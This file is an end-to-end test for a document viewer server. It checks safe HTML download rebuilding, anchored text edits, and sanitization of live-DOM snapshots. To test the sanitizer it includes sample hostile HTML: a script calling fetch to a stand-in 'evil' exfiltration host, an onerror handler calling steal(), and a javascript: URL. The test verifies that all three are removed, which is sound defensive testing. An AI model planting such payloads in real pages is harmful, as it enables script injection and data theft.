// Interactive (sandboxed-iframe) docs: end-to-end of the SAFE download rebuild.
//
// The viewer never serializes the live post-JS DOM (that could bake in whatever the
// doc's runtime injected). Instead it rebuilds the download from the ORIGINAL bytes
// (/api/raw) + stored text edits, applied by content-hash anchor. This test drives
// that exact pipeline against the real server + real anchoring.js and asserts:
//   1. the original <script> (JS) survives into the download,
//   2. an edit to MARKUP text lands on the right block (matched by anchor),
//   3. text the doc's JS would generate at runtime is NOT present in the rebuild,
//   4. no data-hs-* bookkeeping leaks into the output.
import { JSDOM } from 'jsdom';
import { openDb } from '../db.js';
import { assignAnchors } from '../public/anchoring.js';
import { unlink } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

process.env.OWNER_KEY = process.env.OWNER_KEY || 'interactive-test-owner-key';
const KEY = process.env.OWNER_KEY;
const { createApp } = await import('../server.js');

const DOCS_DIR = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'docs');
const TMP_ID = 'zz-interactive-test-doc';
const TMP_FILE = path.join(DOCS_DIR, `${TMP_ID}.html`);
const TMP_RAW = path.join(DOCS_DIR, `${TMP_ID}.raw.html`);

const db = openDb(':memory:');
const server = await new Promise((res) => { const s = createApp(db).listen(0, () => res(s)); });
const base = `http://localhost:${server.address().port}`;

let pass = 0, fail = 0;
const ok = (c, m) => { if (c) pass++; else { fail++; console.error('  ✗ ' + m); } };
const withKey = (u) => u + (u.includes('?') ? '&' : '?') + 'key=' + encodeURIComponent(KEY);
const post = (u, body) => fetch(base + withKey(u), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body || {}) });

// Overlay text is stored HTML-escaped by /api/edit; the rebuild decodes it back to
// plain text before writing textContent (same as the viewer/frame-controller do).
const decodeEntities = (dom, escaped) => { const t = dom.window.document.createElement('textarea'); t.innerHTML = escaped; return t.value; };

async function cleanup() { await unlink(TMP_FILE).catch(() => {}); await unlink(TMP_RAW).catch(() => {}); }
await cleanup();

try {
  // An interactive doc: real markup text (a heading, a paragraph) PLUS a container
  // the doc's own JS fills at runtime, PLUS a nested inline-styled badge.
  const html = '<!doctype html><html><head><title>t</title></head><body>'
    + '<h1>Model Overview</h1>'
    + '<div class="badge"><span>Validated by Red Hat</span></div>'
    + '<p>Intro paragraph.</p>'
    + '<div id="live"></div>'
    + '<script>document.getElementById("live").textContent = "GENERATED-AT-RUNTIME";</script>'
    + '</body></html>';

  let r = await post('/api/upload', { id: TMP_ID, html, overwrite: true });
  ok((await r.json()).interactive === true, 'uploaded as interactive');

  // Compute anchors the SAME way the download rebuild does: assignAnchors over the
  // ORIGINAL markup (anchoring.js, unchanged). BLOCK_TAG leaves with direct text
  // (the <h1>, the <p>) are anchored; the JS-generated <div id="live"> text is not
  // (its text doesn't exist in the original markup); and the inline-nested badge
  // (<span> inside <div>, no direct block text) is deliberately NOT anchored by the
  // base pipeline — broadening to inline badges is the frame-controller's job.
  const origDom = new JSDOM(html);
  const origMap = await assignAnchors(origDom.window.document.body);
  let paraAnchor = null, headingAnchor = null, liveAnchor = null, badgeAnchor = null;
  for (const [anchor, el] of origMap) {
    const t = el.textContent.replace(/\s+/g, ' ').trim();
    if (t === 'Intro paragraph.') paraAnchor = anchor;
    if (t === 'Model Overview') headingAnchor = anchor;
    if (t === 'GENERATED-AT-RUNTIME') liveAnchor = anchor;
    if (t === 'Validated by Red Hat') badgeAnchor = anchor;
  }
  ok(paraAnchor !== null, 'paragraph is an anchorable markup leaf');
  ok(headingAnchor !== null, 'heading is an anchorable markup leaf');
  ok(liveAnchor === null, 'JS-generated text has NO anchor in the original markup (not editable)');
  ok(badgeAnchor === null, 'inline-nested badge is NOT anchored by the base download pipeline');

  // Edit the paragraph via /api/edit (stores escaped overlay), as the bridge would.
  r = await post(`/api/edit/${TMP_ID}`, { anchor: paraAnchor, text: 'Revised paragraph.' });
  ok(r.status === 200, 'edit stored -> 200');

  // --- reproduce the viewer's downloadHtml rebuild for an interactive doc ---
  const rawHtml = (await (await fetch(base + `/api/raw/${TMP_ID}`)).json()).rawHtml;
  const overlay = (await (await fetch(base + withKey(`/api/doc/${TMP_ID}`))).json()).overlay;

  const dom = new JSDOM(rawHtml);
  const doc = dom.window.document;
  // jsdom parseFromString-equivalent: JSDOM does NOT run scripts (no runScripts
  // option), so <script> stays inert in the DOM — exactly like DOMParser in the
  // browser download path. The runtime text is therefore never produced here.
  const map = await assignAnchors(doc.body);
  for (const [anchor, entry] of Object.entries(overlay || {})) {
    const el = map.get(anchor);
    if (!el || !entry) continue;
    el.textContent = decodeEntities(dom, entry.text);
  }
  for (const el of doc.querySelectorAll('*')) {
    for (const attr of [...el.attributes]) {
      if (attr.name.startsWith('data-hs-')) el.removeAttribute(attr.name);
    }
  }
  const out = '<!doctype html>\n' + doc.documentElement.outerHTML;

  // 1. Original JS survived.
  ok(/<script/i.test(out) && out.includes('GENERATED-AT-RUNTIME'), 'download keeps the original <script> (JS intact)');
  // 2. Markup edit applied on the right block.
  ok(out.includes('Revised paragraph.'), 'markup text edit is baked into the download');
  ok(!out.includes('Intro paragraph.'), 'old paragraph text replaced, not duplicated');
  ok(out.includes('Model Overview'), 'unedited markup preserved');
  // Badge markup is untouched (it wasn't editable, so it rides through verbatim).
  ok(out.includes('Validated by Red Hat'), 'inline badge markup preserved verbatim in download');
  // 3. The runtime-generated TEXT is not present in the rebuilt DOM (only the JS
  //    that would produce it). The <div id="live"> is empty in the download.
  const liveDiv = new JSDOM(out).window.document.getElementById('live');
  ok(liveDiv && liveDiv.textContent === '', 'JS-generated text is NOT baked in (live container is empty until the file runs)');
  // 4. No bookkeeping leaked.
  ok(!/data-hs-/.test(out), 'no data-hs-* attributes leak into the download');

  // --- 7. Static "edited snapshot" download: POST /api/snapshot sanitizes the
  //        UNTRUSTED live-DOM string (the frame ran the doc's JS) so the file the
  //        user keeps has no runnable content, while the edited text survives. ---
  // Simulate what the frame would serialize: the post-JS DOM with the reviewer's
  // edit applied to the JS-generated text, PLUS hostile content a malicious bundle
  // could have injected into the live DOM.
  const liveDom = '<!doctype html><html><head><title>t</title></head><body>'
    + '<h1>Model Overview</h1>'
    + '<div id="live">EDITED GENERATED TEXT</div>'
    + '<script>fetch("//evil/exfil")</script>'                 // injected script
    + '<img src=x onerror="steal()">'                          // injected handler
    + '<a href="javascript:evil()">x</a>'                      // javascript: URL
    + '</body></html>';

  let snap = await fetch(base + withKey(`/api/snapshot/${TMP_ID}`), {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ html: liveDom }),
  });
  ok(snap.status === 200, 'POST /api/snapshot -> 200 for interactive doc');
  ok(snap.headers.get('x-content-type-options') === 'nosniff', '/api/snapshot sends nosniff');
  const snapHtml = (await snap.json()).html;
  ok(!/<script/i.test(snapHtml), 'snapshot has NO <script> (inert)');
  ok(!/onerror/i.test(snapHtml), 'snapshot strips injected event handler');
  ok(!/javascript:/i.test(snapHtml), 'snapshot neutralizes javascript: URL');
  ok(snapHtml.includes('EDITED GENERATED TEXT'), 'snapshot KEEPS the edited (JS-generated) text');
  ok(snapHtml.includes('Model Overview'), 'snapshot keeps markup text too');

  // 8. Snapshot scoping / validation.
  ok((await fetch(base + withKey(`/api/snapshot/${TMP_ID}`), {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ html: '' }),
  })).status === 400, 'empty snapshot html -> 400');
  ok((await fetch(base + withKey('/api/snapshot/bad*id'), {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ html: '<p>x</p>' }),
  })).status === 400, 'invalid doc id -> 400');
  // A STATIC doc has no live frame to snapshot -> 404 (no_raw).
  await post('/api/upload', { id: TMP_ID + '-static', html: '<!doctype html><body><p>plain</p></body>', overwrite: true });
  ok((await fetch(base + withKey(`/api/snapshot/${TMP_ID}-static`), {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ html: '<p>x</p>' }),
  })).status === 404, 'snapshot of a static (no-raw) doc -> 404');
  await unlink(path.join(DOCS_DIR, `${TMP_ID}-static.html`)).catch(() => {});
} finally {
  await cleanup();
  server.close();
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
